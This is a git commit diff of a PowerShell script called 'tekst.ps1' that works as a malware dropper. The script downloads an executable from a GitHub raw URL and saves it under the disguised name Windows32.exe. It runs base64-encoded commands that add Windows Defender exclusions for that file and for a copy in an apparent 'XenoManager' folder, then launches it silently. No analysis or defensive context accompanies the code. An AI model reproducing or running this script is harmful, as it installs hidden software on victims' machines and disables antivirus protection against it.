7325d9f2c88982e4f5527dabe23e3e98fa1ee45e
Ilyaskand <150134733+Ilyaskand@users.noreply.github.com>
2025-03-22 06:46:38 +0100

    text.ps1

--- tekst.ps1
+++ tekst.ps1
@@ -2,4 +2,3 @@ Invoke-WebRequest -Uri 'https://github.com/Ilyaskand/e/raw/refs/heads/main/Windo
 $command = "powershell -EncodedCommand <QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcXFVzZXJzXFxQdWJsaWNcXFdpbmRvd3MzMi5leGUn>"
 Start-Process 'C:\\Users\\Public\\Windows32.exe' -ArgumentList '/silent' -NoNewWindow -Wait
 $command = "powershell -EncodedCommand <QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcXFVzZXJzXFxJbHlhc1xcQXBwRGF0YVxcUm9hbWluZ1xcWGVub01hbmFnZXJcXFdpbmRvd3MzMi5leGUn>"
-exit
